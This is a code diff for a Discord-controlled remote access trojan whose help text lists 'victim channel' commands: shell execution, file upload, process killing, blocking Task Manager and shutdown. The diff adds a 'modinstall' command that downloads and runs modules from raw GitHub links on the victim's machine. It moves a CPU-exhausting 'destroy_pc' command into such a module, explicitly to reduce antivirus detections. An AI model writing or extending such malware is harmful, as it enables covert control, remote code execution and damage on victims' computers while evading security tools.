@@ -252,10 +252,15 @@ class Program
             await HandleUploadCommand(userMessage, args[1], args[2]);
         }
 
-        if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
-        {
-            await HandleDestroyPCCommand(userMessage);
-        }
+        //if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
+        //{
+        //    await HandleDestroyPCCommand(userMessage);
+        //}
+
+        //if (command == Settings.prefix + "!modinstall" && userMessage.Channel.Id == victimChannel.Id)
+        //{
+        //    await HandleModinstallCommand(userMessage, args[1]);
+        //}
 
         //if (command == Settings.prefix + "camera" && userMessage.Channel.Id == victimChannel.Id)
         //{
@@ -285,25 +290,33 @@ Commands below works only in victim channel
 {Settings.prefix}killprocess [pid]
 {Settings.prefix}filesystem [action] [path]
 {Settings.prefix}cmd [command]
-{Settings.prefix}destroy_pc - Makes the 90% CPU
+{Settings.prefix}destroy_pc - Moved to Modules for make less detections on VTotal
 {Settings.prefix}upload [path] [url] - Uploads file to specific path
+{Settings.prefix}modinstall [raw_link_to_file] - Install and run modification
 {Settings.prefix}msgbox [text] [caption] - show message box
 {Settings.prefix}control [block] - Blocks Taskmgr
 {Settings.prefix}boot - Shutdown the PC
 {Settings.prefix}reboot - Restart the PC
 {Settings.prefix}stop - Stop
--------------------------------------------");
+-------------------------------------------
+Modules
+-------------------------------------------
+https://raw.githubusercontent.com/avirt1274/XRatModifications/refs/heads/main/destroy_pc.cs - Makes the 90% CPU
+
+https://raw.githubusercontent.com/avirt1274/XRatModifications/refs/heads/main/test.cs - Test script
+-------------------------------------------
+");
     }
 
-    private async Task HandleDestroyPCCommand(SocketUserMessage userMessage)
+    private async Task HandleModinstallCommand(SocketUserMessage userMessage, string link)
     {
         var guild = client.GetGuild(Settings.guildId);
         var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
 
-        Utils.DestroyPC();
+        await Utils.ModuleLoader(link);
 
-        await logsChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
-        await victimChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
+        await logsChannel.SendMessageAsync($"Successfully loaded module to victim '{victimId}' | By {userMessage.Author.Mention}");
+        await victimChannel.SendMessageAsync($"Successfully loaded module to victim '{victimId}' | By {userMessage.Author.Mention}");
     }
 
     private async Task HandleUploadCommand(SocketUserMessage userMessage, string path, string url)
